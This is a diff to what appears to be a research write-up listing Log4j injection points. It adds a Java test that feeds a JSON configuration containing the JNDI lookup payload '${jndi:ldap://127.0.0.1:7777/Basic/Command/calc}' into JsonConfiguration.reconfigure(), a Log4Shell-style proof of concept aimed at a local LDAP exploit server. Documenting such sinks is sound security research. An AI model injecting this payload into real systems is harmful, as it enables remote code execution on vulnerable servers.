@@ -177,6 +177,20 @@ This field is utilized within the execute method of AbstractPathAction, which tr
     }
 ```
 
+**JSONConfigurationFactory.reconfigure()**
+
+```
+   @Test
+    public void reconfigureJSONConfigurationFactoryTest() throws IOException {
+        String jsonConfig = "{\"injectedObject\": {\"injectedProperty\":\"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"}}";
+        ByteArrayInputStream bis = new ByteArrayInputStream(jsonConfig.getBytes(StandardCharsets.UTF_8));
+        ConfigurationSource source = new ConfigurationSource(bis);
+
+        JsonConfiguration config = new JsonConfiguration(new LoggerContext("testContext"), source);
+        config.reconfigure();
+    }
+```
+
 **LoggerContext.setConfigLocation()**
 ```
 @Test
